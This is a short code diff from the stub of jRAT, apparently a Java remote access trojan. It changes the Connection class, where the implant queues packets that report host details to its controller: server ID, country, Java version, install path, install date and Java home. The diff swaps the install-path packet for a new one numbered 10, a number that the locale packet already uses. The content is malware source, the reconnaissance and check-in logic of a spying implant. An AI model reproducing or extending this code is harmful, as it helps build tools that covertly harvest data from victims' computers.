@@ -28,7 +28,7 @@ import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import se.jrat.stub.packets.outgoing.Packet10InitDefaultLocale;
 import se.jrat.stub.packets.outgoing.Packet13Status;
 import se.jrat.stub.packets.outgoing.Packet1InitHandshake;
-import se.jrat.stub.packets.outgoing.Packet23InitInstallPath;
+import se.jrat.stub.packets.outgoing.Packet10InitInstallPath;
 import se.jrat.stub.packets.outgoing.Packet9InitJavaVersion;
 import se.jrat.stub.packets.outgoing.Packet26InitJavaPath;
 import se.jrat.stub.packets.outgoing.Packet28InitLanAddress;
@@ -150,13 +150,13 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet7InitServerID());
 		addToSendQueue(new Packet8InitCountry());
 		addToSendQueue(new Packet9InitJavaVersion());
+		addToSendQueue(new Packet10InitInstallPath());
 
 
 
 				
 		addToSendQueue(new Packet31InitInstallationDate(Configuration.date));
 
-		addToSendQueue(new Packet23InitInstallPath(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()));
 
 
 		addToSendQueue(new Packet26InitJavaPath(System.getProperty("java.home")));
